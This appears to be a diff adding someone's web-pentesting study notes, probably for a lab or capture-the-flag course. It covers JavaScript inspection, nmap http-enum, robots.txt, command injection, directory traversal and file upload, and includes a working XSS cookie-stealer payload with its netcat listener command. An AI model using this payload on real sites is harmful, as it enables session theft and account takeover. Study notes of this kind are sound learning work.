@@ -1,0 +1,20 @@
+search html for function definition to see what function does
+
+
+ensure you run the function in the console to see what it truly does
+can search with () to find functions easier
+
+script for http enumeration: --script=http-enum
+
+duplicate the tab once for each directory in robots.txt and then access each directory
+
+command injection can be performed to access directories on the web server
+directory traversal using post method can be done in the input field
+dir traversal using get method is done in the url
+
+ # Cookie stealer, be mindful of where nc listener is
+<script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
+nc -l 127.0.0.1 42070
+
+malicious file upload:
+need to be able to upload file and need to know where the file will be uploaded
